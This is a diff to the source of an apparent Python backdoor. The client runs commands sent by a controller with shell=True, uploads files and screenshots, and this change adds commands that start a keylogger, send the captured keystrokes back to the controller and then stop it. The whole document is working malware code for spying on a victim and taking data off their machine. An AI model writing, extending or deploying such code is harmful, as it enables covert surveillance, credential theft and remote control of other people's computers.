@@ -3,6 +3,8 @@ import json
 import subprocess
 import os
 import pyautogui
+import threading
+import keylogger
 
 def send_data(data):
 	jsondata = json.dumps(data)
@@ -62,6 +64,18 @@ def shell():
 			screenshot()
 			upload_file('screenshot.png')
 			os.remove('screenshot.png')
+		elif command[:12] == "keylog_start":
+			keylog = keylogger.Keylogger()
+			t = threading.Thread(target=keylog.start())
+			t.start()
+			send_data("[+] Keylogger Started!")
+		elif command[:11] == "keylog_dump":
+			logs = keylog.read_logs()
+			send_data(logs)
+		elif command[:11] == "keylog_stop":
+			keylog.self_destruct()
+			t.join()
+			send_data("[+] Keylogger Stopped!")
 
 		else:
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
